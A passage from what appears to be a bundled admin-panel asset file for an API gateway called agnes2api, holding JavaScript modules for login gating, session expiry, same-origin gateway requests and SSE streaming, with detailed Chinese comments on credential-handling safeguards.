**收窄一句全称句时，先把它可能失效的轴列全，再逐条验。**\n *\n * 两条边界都在 `tests/ui/api-session.test.ts` 里有会红的登记：\n * 轴一见那里的「反向自检：补进表里的那三种写法，每一种都真的被数出来」与\n * 「已知抓不住的写法确实抓不住（边界是断言，不是散文）」；\n * 轴二见后者那三条，与「插值捞不齐的那些行今天恰好一处 —— 这道扫描在那一行上是瞎的」那一格。\n * ⚠️ **这里原来写的是行号，P3d Task 7 往那个文件里插了几格用例之后它就漂了**\n *（第 8 道门禁当场抓住）。名字锚没有这个毛病，改用名字锚。\n *\n * **两把钥匙严格隔离**（设计文档 §10.5）：\n * 本模块只发 `x-admin-key`、只打 `/admin/api/*`。网关口令与 `/v1` 是 P3d 的\n * Playground 的事，**不许在这里出现**。\n * 两条禁令各有一条行为用例钉着：`tests/ui/api-session.test.ts:227`（凭据头只有\n * `x-admin-key`，没有任何 `authorization` / 网关口令头）与 `:239`（出口 URL\n * 规范化之后落在哪里，含 `..` 那一档的如实登记）。\n * ⚠️ 这两条原来写的是「各有一条单测钉着」，而当时 `/v1` 那条只有一句附带的 URL\n * 断言、网关口令那条**一条都没有**（全分支评审 C3）。\n *\n * **401 = 会话失效；403 明确不当会话失效。**\n * 后者是照抄 kiro2api 用中文注释警告过的那个坑：它老写法把业务 403 当掉线，\n * 管理员拒绝一次授权就被踢出后台并被告知「密钥无效」。\n * 两条对称用例钉着这一对：`tests/ui/api-session.test.ts:187` 与 `:197`。\n * ⚠️ 这句原来也在宣称「两条对称用例进单测」，而当时是**零条**：把下面\n * `res.status === 401` 改成 `|| res.status === 403` 之后 1357 条全绿\n *（全分支评审 C3 实测）。\n */\nimport { sessionExpired } from \"./pure/session.mjs\";\n// 键名的单一真源，见该模块文件头（全分支评审 C4）。**别在这里再声明一遍**：\n// 写入方是 `app.js`，两处分叉会让面板登录成功之后每个请求都送空口令头。\nimport { KEY_STORE, SAVED_AT_STORE } from \"./pure/storage-keys.mjs\";\n\nconst BASE = \"/admin/api\";\n\nexport class ApiError extends Error {\n  constructor(status, message, body) {\n    super(message);\n    this.name = \"ApiError\";\n    this.status = status;\n    this.body = body;\n  }\n}\n\nlet unauthorizedHandler = null;\n/** 会话失效时的回调（清 key + 弹登录浮层）。只由 app.js 注册一次。 */\nexport function onUnauthorized(cb) { unauthorizedHandler = cb; }\n\nfunction readKey() {\n  try { return localStorage.getItem(KEY_STORE) || \"\"; } catch (e) { return \"\"; }\n}\n\n/**\n * 会话是不是已经到达绝对上限。判定在 `js/pure/session.mjs`，这里只喂参数。\n *\n * ⚠️ **为什么这一判必须在每个请求上做，而不是只在 `app.js` 启动那一次做。**\n * 面板是**常驻**的：事件在轮询、Key 池有自动刷新，运维把标签页开一整天是常态。\n * 只在模块加载那一次判的话，12 小时到点后这个标签页照样拿着那把口令继续打接口\n * ——而五语言 DEPLOY.md 逐字承诺「面板会在 12 小时后要求重新输入口令」，\n * 那就成了**一句被测试保护起来、却在最常见的路径上不成立的承诺**。\n * `js/pure/session.mjs` 开头那句「可用期从永远压到最多 12 小时」也要有这一判才成立。\n *\n * 放在**发请求之前**：过期就不发，与前端字符集拦截同一个道理——送出去也没用，\n * 而且会在服务端留下一条无意义的 `admin.login_failed`。\n */\nfunction expired() {\n  try {\n    return sessionExpired(Number(localStorage.getItem(SAVED_AT_STORE)), Date.now());\n  } catch (e) {\n    // 隐私模式下 localStorage 抛错：读不到时刻 ⇒ 与 sessionExpired 同一个方向，fail closed。\n    return true;\n  }\n}\n\nexport async function raw(method, path, body, init) {\n  // **会话绝对上限，每请求复查一次**（见 expired 的说明）。走的是与 401 完全相同的\n  // 那条通路：`unauthorizedHandler()` 清会话 + 回登录闸，再抛同一个 ApiError ——\n  // 调用方（各板块的轮询/刷新）已经会处理 401，不需要为过期再认一种新错误。\n  if (expired()) {\n    if (unauthorizedHandler) unauthorizedHandler();\n    throw new ApiError(401, \"session_expired\", null);\n  }\n  // 口令只走请求头。**禁止 Cookie 会话、禁止 ?key=**：口令进 URL 会落进浏览器历史、\n  // Referer、CF 访问日志、反代日志。这条禁令同时否掉了 EventSource（它设不了请求头）。\n  const headers = { \"x-admin-key\": readKey() };\n  if (body !== undefined) headers[\"content-type\"] = \"application/json\";\n  const res = await fetch(BASE + path, {\n    method,\n    headers: Object.assign(headers, (init && init.headers) || {}),\n    body: body === undefined ? undefined : JSON.stringify(body),\n    // 同源，且刻意不带凭据：本项目没有 Cookie 会话，带上只会扩大攻击面。\n    credentials: \"omit\",\n    signal: init && init.signal,\n  });\n  if (res.status === 401) {\n    // **只有 401 清会话。** 403 是「这个操作被拒绝」，不是「你没登录」。\n    if (unauthorizedHandler) unauthorizedHandler();\n    throw new ApiError(401, \"unauthorized\", null);\n  }\n  return res;\n}\n\nasync function json(method, path, body, init) {\n  const res = await raw(method, path, body, init);\n  let parsed = null;\n  try { parsed = await res.json(); } catch (e) { parsed = null; }\n  if (!res.ok) {\n    const msg = parsed && parsed.error && parsed.error.message ? parsed.error.message : `http_${res.status}`;\n    throw new ApiError(res.status, msg, parsed);\n  }\n  return parsed;\n}\n\nexport const api = {\n  get:   (p, init) => json(\"GET\", p, undefined, init),\n  post:  (p, b, init) => json(\"POST\", p, b, init),\n  put:   (p, b, init) => json(\"PUT\", p, b, init),\n  // P3c Task 4：Key 池的行内动作（停用/启用/清冷却/解除剔除/备注）都是\n  // `PATCH /admin/api/keys/:id`，此前没有任何调用方需要这个动词。\n  patch: (p, b, init) => json(\"PATCH\", p, b, init),\n  del:   (p, init) => json(\"DELETE\", p, undefined, init),\n  raw,\n};\n", type: "text/javascript; charset=utf-8", etag: "\"12ece599a97163de\"" },
  "/admin/js/app.js": { body: "/**\n * 面板入口：登录闸 + 板块注册表 + `showSection`。\n *\n * 板块契约（设计文档 §9.3）：`A.sections.<name> = { init?, onShow?, onHide? }`。\n * `showSection` 负责：切 .active、首次 init()、每次 onShow()、\n * 离开时上一个板块 onHide()（**停轮询、作废在飞请求**）、把板块名写 localStorage。\n * **没有 URL 路由、没有 hash**（放弃深链接，换与 kiro2api 一致的刷新复原行为）。\n *\n * ⚠️ **板块内不许各自监听 langchange**：框架层在这里统一 apply(document) +\n * 重跑当前板块的 onShow()。板块自己再监听一次就是 kiro2api 那 4 处冗余监听。\n */\nimport { t, apply, setLang, currentLang, LANGS } from \"./i18n.js\";\nimport { getTheme, toggleTheme, setTheme } from \"./theme.js\";\nimport { onUnauthorized } from \"./api.js\";\nimport { overviewSection } from \"./sec-overview.js\";\nimport { keysSection } from \"./sec-keys.js\";\nimport { registrarSection } from \"./sec-registrar.js\";\nimport { eventsSection } from \"./sec-events.js\";\nimport { usageSection } from \"./sec-usage.js\";\nimport { modelsSection } from \"./sec-models.js\";\nimport { playgroundSection } from \"./sec-playground.js\";\nimport { settingsSection } from \"./sec-settings.js\";\nimport { sessionExpired } from \"./pure/session.mjs\";\nimport { sendable } from \"./pure/sendable.mjs\";\n// **键名不在这里声明**（全分支评审 C4）：写入方在这个文件、读取方在 `api.js`，\n// 各写一份的后果实测过——只改这边一处 ⇒ 登录成功进壳层、随后每请求送空口令头\n// ⇒ 401 ⇒ 登出循环，面板彻底不可用而全套用例照绿。理由全文见那个模块的文件头。\nimport { KEY_STORE, SAVED_AT_STORE, SECTION_STORE, GW_KEY_STORE } from \"./pure/storage-keys.mjs\";\n\nconst SECTIONS = {\n  overview: overviewSection, keys: keysSection, registrar: registrarSection, events: eventsSection,\n  usage: usageSection, models: modelsSection, playground: playgroundSection, settings: settingsSection,\n};\n\nconst gate = document.getElementById(\"gate\");\nconst shell = document.getElementById(\"shell\");\nconst form = document.getElementById(\"gate-form\");\nconst input = document.getElementById(\"gate-key\");\nconst err = document.getElementById(\"gate-err\");\n\nfunction store(op, value) {\n  try {\n    if (op === \"get\") return localStorage.getItem(KEY_STORE);\n    if (op === \"getAt\") return localStorage.getItem(SAVED_AT_STORE);\n    if (op === \"set\") {\n      localStorage.setItem(KEY_STORE, value);\n      localStorage.setItem(SAVED_AT_STORE, String(Date.now()));\n    }\n    if (op === \"del\") {\n      localStorage.removeItem(KEY_STORE);\n      localStorage.removeItem(SAVED_AT_STORE);\n      // ⚠️ **网关口令一并清**（P3d Task 10 评审 M2）：它是这块存储里的第二把凭据，\n      //    而它比管理口令还弱（没有年龄上限、后端没有撤销路径）。理由全文与那两处\n      //    缺一不可的接线见 `js/pure/storage-keys.mjs` 的 `GW_KEY_STORE`。\n      localStorage.removeItem(GW_KEY_STORE);\n    }\n  } catch (e) { /* 隐私模式：本次会话照常可用，刷新后要重新输入 */ }\n  return null;\n}\n\nlet current = null;\n\nfunction showSection(name) {\n  if (!SECTIONS[name]) name = \"overview\";\n  if (current === name) { SECTIONS[name].onShow && SECTIONS[name].onShow(); return; }\n  if (current && SECTIONS[current] && SECTIONS[current].onHide) SECTIONS[current].onHide();\n  for (const btn of document.querySelectorAll(\".nav-item\")) {\n    btn.classList.toggle(\"active\", btn.getAttribute(\"data-section\") === name);\n  }\n  for (const sec of document.querySelectorAll(\".section\")) {\n    sec.classList.toggle(\"active\", sec.id === `sec-${name}`);\n  }\n  const s = SECTIONS[name];\n  if (!s.__inited) { s.init && s.init(document.getElementById(`sec-${name}`)); s.__inited = true; }\n  s.onShow && s.onShow();\n  current = name;\n  try { localStorage.setItem(SECTION_STORE, name); } catch (e) { /* ignore */ }\n}\n\nfunction enter() {\n  gate.classList.add(\"off\");\n  shell.classList.add(\"on\");\n  let saved = \"overview\";\n  try { saved = localStorage.getItem(SECTION_STORE) || \"overview\"; } catch (e) { /* ignore */ }\n  showSection(saved);\n}\n\nfunction leave(reason) {\n  if (current && SECTIONS[current] && SECTIONS[current].onHide) SECTIONS[current].onHide();\n  current = null;\n  store(\"del\");\n  shell.classList.remove(\"on\");\n  gate.classList.remove(\"off\");\n  input.value = \"\";\n  err.textContent = reason ? t(reason) : \"\";\n}\n\n/**\n * 登录探针。**这是全站第二个网络出口**（另两个是 `js/api.js` 的 `raw()` 与\n * P3d Task 10 的 `js/gw-api.js`）——`api.js` 的文件头一度把「全站唯一网络出口」\n * 当成它那段安全论证的前提，那句是假的（全分支评审 C3），两边现在都说准了。\n * ⚠️ **「也是最后一个」这半句同样活不过一期**：它在 P3d Task 10 被 Playground 的\n * 对外出口推翻了。⭐ 记一条形状：**一句「到此为止」的话，写下时是真的，\n * 而推翻它的往往就是同一份计划里排在后面的那个任务。**\n *\n * **刻意不走 `api.js`**，三条理由缺一不可：\n * ① 这一刻还没有会话——时刻键要到 `store(\"set\")` 才写下，`api.js` 的 `expired()`\n *    前置会把每一次登录都判成过期（`Number(null) === 0` ⇒ `savedAt <= 0`）；\n * ② 这里的 401 意思是「口令不对」，不是「你掉线了」，走 `onUnauthorized()` 会\n *    在登录闸上再弹一次登录闸；\n * ③ 口令还没进 `localStorage`，`api.js` 的 `readKey()` 读不到它。\n * 出口数量由 `tests/ui/api-session.test.ts` 的\n * 「恰好三处：api.js 的 raw()、app.js 的登录探针、gw-api.js 的网关出口」\n * 数着钉住：**照它那张手写枚举表里的七种写法写、并且不在带花括号的插值里**，\n * 加第四个会变红。\n * ⚠️ **那张表原来只有四种写法，P3d Task 10 把漏掉的三种补齐了**\n * （`new WebSocket(` / 动态 `import(` / 把 fetch 先存进变量再调；评审 F-11 实测各得 0）。\n * 补齐之后它仍然沿另一条轴漏一族：抠模板串字面文本那一步会把**带花括号的插值**\n * 整条吃掉——`admin-ui/js/sec-overview.js` 那条渲染「上次检查时间」的模板串就是这个形状，\n * 往它里面塞一个真 `fetch` 实测全绿（定向复评 H-1）。\n * 边界全文见 `admin-ui/js/api.js` 文件头。\n */\nasync function probe(key) {\n  const res = await fetch(\"/admin/api/session\", { headers: { \"x-admin-key\": key }, credentials: \"omit\" });\n  if (res.status === 401) return { ok: false, reason: \"gate.invalid\" };\n  // 403 **不当会话失效**：将来某个操作被拒绝时把人踢出后台并告知「密钥无效」，\n  // 是 kiro2api 踩过的坑。这里只有 401 才算登录失败。\n  if (!res.ok) return { ok: false, reason: \"gate.httpError\", status: res.status };\n  return { ok: true, body: await res.json() };\n}\n\nform.addEventListener(\"submit\", async (e) => {\n  e.preventDefault();\n  const key = input.value.trim();\n  err.textContent = \"\";\n  if (!key) { err.textContent = t(\"gate.empty\"); return; }\n  // 字符集判定在 `js/pure/sendable.mjs`，**与后端 `SENDABLE` 逐码位等价**\n  //（`tests/ui/sendable-parity.test.ts` 的「逐码位……行为等价」断言钉着，不是源码文本比对）。\n  // 前端这一半必须有：后端只在启动时看得到自己的口令，看不到用户粘了什么。\n  // 判定本身不许在这个文件里再写一遍（admin-ui/README.md 硬规则 1）。\n  if (!sendable(key)) { err.textContent = t(\"gate.badShape\"); return; }\n  const submit = form.querySelector(\"button\");\n  submit.disabled = true;\n  try {\n    const r = await probe(key);\n    if (!r.ok) {\n      // 失败**绝不**写入 localStorage，也不显示「已登录」。\n      err.textContent = r.reason === \"gate.invalid\" ? t(\"gate.invalid\") : t(\"gate.httpError\", { status: r.status });\n      return;\n    }\n    store(\"set\", key);\n    enter();\n  } catch (e2) {\n    err.textContent = t(\"gate.network\");\n  } finally {\n    submit.disabled = false;\n  }\n});\n\n// 会话失效由 api.js 统一上报：任何一个 401 都把人送回登录闸，并说清原因。\nonUnauthorized(() => leave(\"common.sessionExpired\"));\n\ndocument.getElementById(\"logout-btn\").addEventListener(\"click\", () => leave(null));\ndocument.getElementById(\"theme-btn\").addEventListener(\"click\", () => toggleTheme());\n\nconst langSel = document.getElementById(\"lang-select\");\nfor (const l of LANGS) {\n  const o = document.createElement(\"option\");\n  o.value = l; o.textContent = l;\n  langSel.appendChild(o);\n}\nlangSel.value = currentLang();\nlangSel.addEventListener(\"change\", () => setLang(langSel.value));\n\n// **框架层的兜底：切语言时整页重绘。** 板块自己不许再监听这个事件。\ndocument.addEventListener(\"langchange\", () => {\n  apply(document);\n  if (current && SECTIONS[current] && SECTIONS[current].onShow) SECTIONS[current].onShow();\n});\n\nfor (const btn of document.querySelectorAll(\".nav-item\")) {\n  btn.addEventListener(\"click\", () => showSection(btn.getAttribute(\"data-section\")));\n}\n\napply(document);\nsetTheme(getTheme());\n\n// 已经存过口令就直接验一次；**验不过要清掉**，否则用户会卡在一个永远进不去的页面。\n// 只有 401 才清：接口 500 或断网时清掉等于让一次运维事故顺手把人锁在外面。\n//\n// 但在验之前先过一道**会话绝对上限**：存下来超过 12 小时（或者压根没存时刻——\n// 旧版本存的）就当场清掉、回登录闸，连这一次 probe 都不发。判定在\n// `js/pure/session.mjs`，这里只负责把浏览器存储与时钟喂给它。\nconst saved = store(\"get\");\nif (saved) {\n  if (sessionExpired(Number(store(\"getAt\")), Date.now())) {\n    store(\"del\");\n    err.textContent = t(\"common.sessionExpired\");\n  } else {\n    probe(saved).then((r) => {\n      if (r.ok) enter();\n      else if (r.reason === \"gate.invalid\") store(\"del\");\n    }).catch(() => {});\n  }\n}\n", type: "text/javascript; charset=utf-8", etag: "\"ce74c9352cca9e98\"" },
  "/admin/js/boot.js": { body: "/*\n * 全站唯一的经典脚本：<head> 里同步执行、**不许加 defer / type=\"module\"**。\n *\n * 模块脚本天然 defer，会在 body 绘制之后才跑，于是每次刷新都能看见一次亮色闪白\n *（或一次错误的语言）。这条约束写在这里，改动前先读它。\n *\n * 它也是全站唯一允许在 CSS 之前加载的脚本——主题属性必须在样式表生效前落到\n * <html> 上，否则 :root[data-theme=\"dark\"] 那一整组覆盖会晚一帧。\n */\n(function () {\n  try {\n    var theme = localStorage.getItem(\"agnes2api_theme\");\n    if (theme === \"dark\") document.documentElement.setAttribute(\"data-theme\", \"dark\");\n    // light 时**移除属性**而不是设成 \"light\"：CSS 里 :root 是亮色全量 token，\n    // [data-theme=\"dark\"] 整体覆盖，多一个 light 值只会多一条永远匹配不上的规则。\n    var lang = localStorage.getItem(\"agnes2api_lang\") || \"zh-CN\";\n    document.documentElement.setAttribute(\"data-lang\", lang);\n    document.documentElement.lang = lang;\n  } catch (e) {\n    // localStorage 被禁用（隐私模式 / 三方 cookie 拦截）时什么都不做，走默认外观。\n    // 这里**不能抛**：它是同步脚本，抛出去会让后面的样式表和模块脚本一起停摆。\n  }\n})();\n", type: "text/javascript; charset=utf-8", etag: "\"8a498ad988cce75a\"" },
  "/admin/js/gw-api.js": { body: "/**\n * **Playground 专用**的对外网关出口。与 `js/api.js` 严格隔离（设计 §10.5）。\n *\n * ⚠️ **两把钥匙的隔离是双向的，两边各有一条断言**：\n * · `js/api.js` 只发 `x-admin-key`、只打管理那棵树\n *   （`tests/ui/api-session.test.ts` 的「凭据头只有 x-admin-key —— 没有任何网关口令头」\n *    与「没有任何调用方给 api.* 传含 `..` 或以 http 开头的 path」两格钉着）；\n * · 本模块只发网关口令、只打对外那棵树，**一个 `x-admin-key` 都不许出现**\n *   （`tests/ui/gw-api.test.ts` 的\n *    「凭据头里没有 x-admin-key —— 管理口令绝不许走上对外那条路」钉着）。\n *\n * ⚠️ **网关口令由用户手动粘贴，存在与管理口令分开的另一个存储键**\n * （`js/pure/storage-keys.mjs` 的 `GW_KEY_STORE`，理由全文在那里）。\n * 面板拿不到明文网关口令——`GET /admin/api/config` 对 `gatewayToken` 只回\n * `{ configured, hint }`（设计 §8.6「凭据只写不读」）。\n * **别想着做「一键填入我的口令」，那需要在后端开一个明文回显口子。**\n *\n * ⚠️ **口令只走请求头，禁止查询参数。** 对外那棵树的鉴权确实收查询参数\n * （`src/http/middleware/auth.ts`，为 Gemini 协议兼容），**但面板不继承它**：\n * 口令进 URL 会落进浏览器历史、Referer、CF 访问日志、反代日志。\n * 这与设计 §8.3 对管理端点的禁令是同一条理由，只是这次进 URL 的是网关口令。\n * 由 `tests/ui/gw-api.test.ts` 的\n * 「口令只在请求头里，URL 上一个字节都没有 —— 进 URL 就会落进历史与各级访问日志」钉着。\n *\n * ⚠️⚠️ **这是全站第三个网络出口。** 另两个是 `js/api.js` 的 `raw()` 与 `js/app.js` 的\n * 登录探针。三个出口这件事由 `tests/ui/api-session.test.ts` 的\n * 「恰好三处：api.js 的 raw()、app.js 的登录探针、gw-api.js 的网关出口」那格数着钉住。\n * ⚠️ 那张枚举表**在 P3d Task 10 之前漏三种写法**（`new WebSocket(` / 动态 `import(` /\n * 把 fetch 先存进变量再调），本任务把三种一并补进去并各种了一次探针。\n * 它仍然沿另一条轴漏一族：**带花括号的插值会被整条抠掉**——本模块因此**不许**把\n * 这里唯一那次真调用写进任何模板串的插值里。\n *\n * ⚠️ **本模块不拼任何端点路径。** URL 整条由 `js/pure/playground.mjs` 的\n * `buildRequest()` 用「运行期的 origin + 目录给的路径模板」拼出来，本文件只负责把它\n * 送出去。全局约束 15：四个消费者只许有一份「怎么调这个网关」的知识。\n */\nimport { GW_KEY_STORE } from \"./pure/storage-keys.mjs\";\nimport { authHeaderValue, sseFrames } from \"./pure/playground.mjs\";\n\n/** 这次请求为什么没发出去 / 没读回来。**只有档位名，永不含口令或响应体。** */\nexport class GatewayError extends Error {\n  constructor(code) {\n    super(code);\n    this.name = \"GatewayError\";\n    this.code = code;\n  }\n}\n\n/** 浏览器里存着的那把网关口令。隐私模式下读不到就是空串（与 `js/api.js` 同一个方向）。 */\nexport function readGatewayToken() {\n  try {\n    return localStorage.getItem(GW_KEY_STORE) || \"\";\n  } catch (e) {\n    return \"\";\n  }\n}\n\n/**\n * 存下这把口令。**空串 = 清掉**，不是存一个空值：留着一个空串会让下次进来时\n * 「粘过但清空了」与「从来没粘过」分不开。\n */\nexport function writeGatewayToken(value) {\n  try {\n    if (value === \"\") localStorage.removeItem(GW_KEY_STORE);\n    else localStorage.setItem(GW_KEY_STORE, value);\n  } catch (e) { /* 隐私模式：本次会话照常可用，刷新后要重新粘 */ }\n}\n\n/**\n * 发一次对外请求。\n *\n * @param req    `buildRequest()` 交出来的那份（`url` / `method` / `headerName` / `body`）。\n * @param token  网关口令。**调用方负责拦「还没粘口令」那一档**，见 `buildRequest` 的说明。\n * @param opts   `{ origin, signal }`。\n *\n * ⚠️⚠️ **同源自查：口令只许送去面板自己所在的那个源。** URL 是拿运行期的 origin 拼的，\n * 正常情况下它恒同源；这一判把「同源」从一条**推导出来的**性质变成一条**被检查的**性质\n * ——一份被改过的协议目录（管理接口被穿透、或反代插了一手）足以把路径模板换成一条指向\n * 别处的地址，而那一刻这里送出去的是**发给每一个下游用户的那把中转口令**。\n * 判失败时**一个字节都不发**。由 `tests/ui/gw-api.test.ts` 的\n * 「目录把路径换成了别的源：一个字节都不发 —— 送出去的是发给每个下游用户的那把口令」钉着。\n *\n * ⚠️ **同源自查只管「第一条 URL」，跨源重定向必须另外堵**（评审 M1）。\n * `fetch` 的 `redirect` 默认是 `follow` ⇒ 同源那条路径回一个 302 指向别处时，\n * 浏览器会**跟过去**，而这一判早在发请求之前就做完了、对它完全不设防。\n * ⚠️⚠️ **不能指望浏览器替我们剥掉那个头**：Fetch 规范里\n * **CORS non-wildcard request-header name 只有 `authorization` 一个**，\n * 跨源重定向时只删它。而四条协议里 **Anthropic 用 `x-api-key`、Gemini 用 `x-goog-api-key`，\n * 这两个不会被删**，会原样跟着 302 送到新源——**那一刻送出去的仍是发给每一个下游用户的\n * 那把中转口令**。而且在本模块自己声明的那个威胁模型里\n * （「管理接口被穿透、或反代插了一手」），**让同源某条路径 302 比篡改协议目录更容易**。\n * ⇒ **`redirect: \"error\"`**：本项目对外五条端点没有任何合法重定向，\n * 一次重定向在这里只可能是异常。由 `tests/ui/gw-api.test.ts` 的\n * 「重定向一律当错误处理 —— 跟过去的话 x-api-key / x-goog-api-key 会被原样带到新源」钉着。\n *\n * ⚠️ **`credentials: \"omit\"`**：本项目没有 Cookie 会话，带上只会扩大攻击面\n * （与 `js/api.js` 同一条）。\n *\n * ⚠️ **失败一律抛 `GatewayError`，错误里只带档位名。** 别把 `err.message` 拼成\n * 「请求 X 失败，头是 Y」那种诊断串——那正是口令漏进错误文案的路径（全局约束 11(b)）。\n */\nasync function openGateway(req, token, opts) {\n  const origin = opts && typeof opts.origin === \"string\" ? opts.origin : \"\";\n  let target = null;\n  try {\n    target = new URL(String(req.url));\n  } catch (e) {\n    throw new GatewayError(\"bad_url\");\n  }\n  if (origin === \"\" || target.origin !== origin) throw new GatewayError(\"cross_origin\");\n\n  const headers = {};\n  headers[String(req.headerName)] = authHeaderValue(req.headerName, token);\n  headers[\"content-type\"] = \"application/json\";\n\n  try {\n    return await fetch(target.href, {\n      method: String(req.method),\n      headers,\n      body: JSON.stringify(req.body),\n      credentials: \"omit\",\n      // **同源自查只管第一条 URL**，跟过去的重定向它管不着 —— 见上面那段 ⚠️。\n      redirect: \"error\",\n      signal: opts && opts.signal,\n    });\n  } catch (e) {\n    // 断网 / 被取消 / CORS 挡下：**这次请求没有拿到任何响应**，与上游的状态无关。\n    throw new GatewayError(\"transport_error\");\n  }\n}\n\n/** 响应体当 JSON 读一遍。**读不出来是 `null`，不是空对象**（后者与「上游回了个空对象」同形）。 */\nasync function readJson(res) {\n  try {\n    return await res.json();\n  } catch (e) {\n    // 非 JSON 响应（网关自己的 502 页、反代的错误页）。\n    return null;\n  }\n}\n\n/**\n * 发一次**非流式**请求，把整份响应体读回来。\n *\n * @param req    `buildRequest()` 交出来的那份（`url` / `method` / `headerName` / `body`）。\n * @param token  网关口令。**调用方负责拦「还没粘口令」那一档**，见 `buildRequest` 的说明。\n * @param opts   `{ origin, signal }`。**`origin` 不传就是一个字节都不发**（见 `openGateway`）。\n *\n * ⚠️ **`contentType` 是 P3d Task 12 加的一格，它把一个二义性拆开了。**\n * 在它之前，`body === null` 同时表示两件事：「响应是 JSON 但解析不了」与\n * 「响应根本不是 JSON」。对话四条协议下后者不会发生，**媒体那两档下它是常态**\n * ——`src/http/routes/media.ts` 的文件头写着「上游返回什么（地址或字节流）就原样转发」，\n * 而字节流那一档在面板上必须说成「这次回的是一段字节，不是一份可展示的结果」，\n * 不能说成「读不出来」。判据因此建在响应头上，**不是靠猜**。\n * ⚠️ **读法不变**：仍然无条件走一次 `readJson()`，对话四条协议逐字保持原行为。\n */\nexport async function sendToGateway(req, token, opts) {\n  const res = await openGateway(req, token, opts);\n  // 头缺失时是空串而不是 `null`：下游只拿它做前缀判定，两种「没有」没必要分开。\n  const contentType = res.headers.get(\"content-type\") || \"\";\n  return { status: res.status, ok: res.ok, contentType, body: await readJson(res) };\n}\n\n/**\n * 发一次**流式**请求，一块一块地把 SSE 的 `data:` 负载交给 `opts.onPayload`。\n *\n * ⚠️⚠️ **它与 `sendToGateway()` 共用同一个 `openGateway()`，这不是省代码、是安全要求。**\n * 同源自查、`redirect: \"error\"`、`credentials: \"omit\"`、「口令只走请求头」这四条\n * 全部长在那个函数里。**流式如果自己另写一次 `fetch`，这四条就各有了第二份**，\n * 而它们里面每一条漏掉的后果都是「把发给每一个下游用户的那把中转口令送去别处」。\n * 由 `tests/ui/gw-api.test.ts` 的\n * 「流式与非流式走同一道同源自查 —— 两条路各写一份的话，漏掉的那份会把口令送去别处」\n * 逐条对着钉（同一组判据在两条路上各断言一遍）。\n * ⚠️ 顺带：本文件因此仍然**只有一处** `fetch(`，`tests/ui/api-session.test.ts` 的\n * 「恰好三处：api.js 的 raw()、app.js 的登录探针、gw-api.js 的网关出口」那张表\n * 不必跟着放宽——**那张表一旦开始跟着代码放宽就不再守任何东西**。\n *\n * ⚠️ **不用 `EventSource`**：它设不了请求头（设计 §7.2 因此否掉了它），\n * 而网关口令必须走头、不许进 URL（见文件头那段）。⇒ 手工 `fetch` + `ReadableStream`。\n *\n * ⚠️ **跨块切分由 `js/pure/playground.mjs` 的 `sseFrames()` 处理**，本函数只负责\n * 「攒—切—把尾巴留着」这个循环。判据与理由全文在那个函数上方。\n *\n * ⚠️ **上游不 ok 时不进读流那条路**：网关的错误响应是 JSON（不是 SSE），\n * 拿 SSE 解析器去读它会得到零条负载 ⇒ 面板显示一次「什么都没发生」的成功流式。\n * 那一档改走 `readJson()`，与非流式同一条渲染路径。\n *\n * @param opts `{ origin, signal, onPayload }`。`onPayload` 收到的是**原始负载字符串**，\n *   **本模块不解析它、也不知道哪条协议的正文在哪一格**——那是协议目录的知识，\n *   由调用方拿 `deltaText()` 就着 `proto` 取（全局约束 15）。\n * @returns 与 `sendToGateway()` 同形，外加 `streamed`：\n *   `true` = 真的走了读流那条路；`false` = 上游没 ok，`body` 里是那份错误响应。\n */\nexport async function streamFromGateway(req, token, opts) {\n  const res = await openGateway(req, token, opts);\n  if (!res.ok || !res.body) {\n    return { status: res.status, ok: res.ok, body: await readJson(res), streamed: false };\n  }\n  const onPayload = opts && typeof opts.onPayload === \"function\" ? opts.onPayload : () => {};\n  const reader = res.body.getReader();\n  const decoder = new TextDecoder();\n  let buf = \"\";\n  try {\n    for (;;) {\n      const step = await reader.read();\n      if (step.done) break;\n      // **`{ stream: true }`**：一个多字节字符同样可能被拆在两个 chunk 之间。\n      // 不带这个标志的话，中文/emoji 会在切点上变成替换符（U+FFFD），\n      // 而那在本机的 ASCII 假上游下**一个字都看不出来**。\n      buf += decoder.decode(step.value, { stream: true });\n      const found = sseFrames(buf);\n      buf = found.rest;\n      for (const p of found.payloads) onPayload(p);\n      if (found.done) break;\n    }\n    // 流可能不以完整的空行结尾（连接中断、反代截断）。**把解码器里滞留的字节 flush 出来，\n    // 再把剩下的当成最后一帧处理**，否则最后一个事件会被静默丢弃\n    //（网关读上游那一侧 `src/core/protocol/sse.ts` 做的是同一件事，同一条理由）。\n    buf += decoder.decode();\n    for (const p of sseFrames(`${buf}\\n\\n`).payloads) onPayload(p);\n  } catch (e) {\n    // 读到一半断了。**已经交出去的那几块留着**——运维看到的半句话是真的发生过的，\n    // 抹掉它比留着更不诚实；调用方据这个错误在那一轮后面补一句「这条流没读完」。\n    throw new GatewayError(\"stream_error\");\n  } finally {\n    // 释放上游连接。已经读完时它是个空操作。\n    reader.cancel().catch(() => {});\n  }\n  return { status: res.status, ok: true, body: null, streamed: true };\n}\n", type: "text/javascript; charset=utf-8", etag: "\"cd2ec0b2e2e2d754\"" },
  "/admin/js/i18n-dict.js": { body: "/**\n * 五语言字典。**唯一真源。**\n *\n * 组织成 key-major（一个键下挂五种语言）而不是 lang-major：\n * 「加了一个键但只填了一种语言」在 key-major 的 diff 里一眼就能看见，\n * 而 lang-major 下它散在五个相距几百行的地方。齐全性有 CI 门禁\n *（`scripts/check-i18n.mjs` 与 `tests/unit/i18n-dict.test.ts` 的\n * 「每个 key 都有全部 5 种语言且非空」两份独立实现），\n * 这个组织方式只是让人工评审也拦得住。\n *\n * 为什么是 .js 而不是 .json：`scripts/build-ui.mjs` 逐字节复制、**零例外**，\n * 那条性质是本项目守住「不引入需要构建步骤的前端框架」的全部依据。\n * 给它开一个「JSON 包裹成 JS」的例外，代价是逐字节断言要加豁免，\n * 而且生成物不在磁盘上 ⇒ 用浏览器直接打开 index.html 时 `import \"./i18n-dict.js\"`\n * 模块解析失败、**整个面板打不开**（ESM 的失败是整条链断）。\n * 已实测：`.js` 同样能被 vitest 直接 import，`pnpm typecheck` 退出 0。\n *\n * ⚠️ `reg.*` 命名空间有**禁用词门禁**（两条邮箱通道必须完全平级）。\n * 想说「默认值」请把那条文案放进别的命名空间，别去给禁用词表开豁免。\n */\nexport const I18N = {\n  // ── 登录闸 ───────────────────────────────────────────────\n  \"gate.title\":       { \"zh-CN\": \"agnes2api 管理后台\", \"zh-TW\": \"agnes2api 管理後台\", en: \"agnes2api Admin\", ja: \"agnes2api 管理画面\", ko: \"agnes2api 관리 콘솔\" },\n  \"gate.sub\":         { \"zh-CN\": \"请输入管理口令（ADMIN_TOKEN）\", \"zh-TW\": \"請輸入管理口令（ADMIN_TOKEN）\", en: \"Enter the 